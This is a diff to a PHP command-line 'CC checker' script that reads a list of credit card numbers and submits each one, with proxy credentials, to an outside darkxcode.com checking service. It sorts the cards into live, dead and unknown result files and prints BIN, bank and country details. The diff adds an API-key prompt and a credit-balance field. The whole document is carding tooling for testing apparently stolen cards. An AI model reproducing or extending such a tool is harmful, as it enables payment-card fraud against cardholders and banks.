@@ -21,6 +21,10 @@ if(empty($listname) || !file_exists($listname)) {
 }
 $lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));
 
+echo " [$BL+$WH]$BL Enter your apikey $GR >> $WH";
+$apikey = trim(fgets(STDIN));
+
+
 $total = count($lists);
 $live = 0;
 $die = 0;
@@ -30,7 +34,7 @@ echo PHP_EOL.PHP_EOL;
 foreach ($lists as $list) {
     $no++;
 
-    $api = "https://darkxcode.com/checker/cc_checker/?cc=$list&proxy=$Proxies&proxyPWD=$proxy_pwd";
+    $api = "https://darkxcode.com/checker/cc_checker/test/?apikey=$apikey&cc=$list&proxy=$Proxies&proxyPWD=$proxy_pwd";
     // CURL
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $api);
@@ -41,6 +45,7 @@ foreach ($lists as $list) {
     curl_close($ch);
     $js  = json_decode($x, TRUE);
     $msg           = $js['data']['info']['msg'];
+    $CRE           = $js['data']['info']['credit_ball'];
     $bin           = $js['data']['info']['bin'];
     $scheme        = $js['data']['info']['scheme'];
     $country       = $js['data']['info']['country'];
@@ -50,11 +55,11 @@ foreach ($lists as $list) {
     if(strpos($x, '"status":"success"')){
         $live++;
         save_file("result/live.txt","$list");
-        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $list$DEF | [$YL BIN$DEF: $MG$bin$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
+        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $list$DEF | [$YL CRE$DEF: $MG$CRE$DEF ] | [$YL BIN$DEF: $MG$bin$DEF ] | [$YL COUNTRY$DEF: $MG$country$DEF ] | [$YL SCHEME$DEF: $MG$scheme$DEF ] | [$YL BANK NAME$DEF: $MG$bank_name$DEF ] | [$YL BANK BRAND$DEF: $MG$bank_brand$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
     }else if (strpos($x, '"status":"failed"')){
         $die++;
         save_file("result/die.txt","$list");
-        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
+        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF |  [$YL CRE$DEF: $MG$CRE$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
     }else{
         $unknown++;
         save_file("result/unknown.txt","$list");
